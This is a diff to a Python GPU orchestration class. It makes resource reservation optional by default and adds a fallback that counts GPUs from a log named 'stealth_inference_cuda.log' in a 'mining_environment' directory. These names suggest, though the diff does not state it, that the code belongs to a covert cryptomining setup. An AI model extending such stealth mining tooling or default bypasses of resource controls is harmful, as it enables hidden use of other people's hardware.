@@ -468,8 +468,9 @@ class GPUOptimizationOrchestrator:
             
             # **Step 1: Request resource coordination** (yêu cầu điều phối tài nguyên)
             if self.coordinator:
-                if not self._acquire_gpu_resources(pid, gpu_index):
-                    # Push a minimal baseline snapshot to metrics hub before returning (best-effort)
+                acquired = self._acquire_gpu_resources(pid, gpu_index)
+                if not acquired:
+                    # Push a minimal baseline snapshot to metrics hub before deciding to return (best-effort)
                     try:
                         baseline_metrics = self._collect_gpu_metrics(gpu_index)
                         self._push_standardized_metrics(baseline_metrics, stage='baseline')
@@ -481,8 +482,13 @@ class GPUOptimizationOrchestrator:
                                 self._push_standardized_metrics(parsed, stage='baseline')
                     except Exception:
                         pass
-                    results['errors'].append("Failed to acquire GPU resources")
-                    return results
+                    # Allow continuing without reservation if COORD_OPTIONAL enabled
+                    allow_continue = str(os.getenv('COORD_OPTIONAL', 'true')).lower() in ('1','true','yes')
+                    if not allow_continue:
+                        results['errors'].append("Failed to acquire GPU resources")
+                        return results
+                    else:
+                        self.logger.warning("[Orchestrator] Proceeding without resource reservation due to COORD_OPTIONAL=true")
             
             # **Step 2: Collect baseline metrics** (thu thập số liệu cơ sở)
             baseline_metrics = self._collect_gpu_metrics(gpu_index)
@@ -680,7 +686,28 @@ class GPUOptimizationOrchestrator:
                 return [0]
             return list(range(count))
         except Exception:
-            # Fallback an toàn
+            # Fallback: parse stealth_inference_cuda.log để đoán số GPU
+            try:
+                logs_dir = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
+                path = Path(logs_dir) / 'stealth_inference_cuda.log'
+                if path.exists():
+                    text = ''
+                    with open(path, 'r') as f:
+                        try:
+                            f.seek(0, 2)
+                            size = f.tell()
+                            f.seek(max(0, size - 16384))
+                        except Exception:
+                            pass
+                        text = f.read()
+                    # Count occurrences of lines starting with "#<index>"
+                    import re
+                    indices = set(int(m.group(1)) for m in re.finditer(r"#(\d+)\s", text))
+                    if indices:
+                        return list(sorted(indices))
+            except Exception:
+                pass
+            # Fallback an toàn cuối cùng
             return [0]
 
     @trace_all
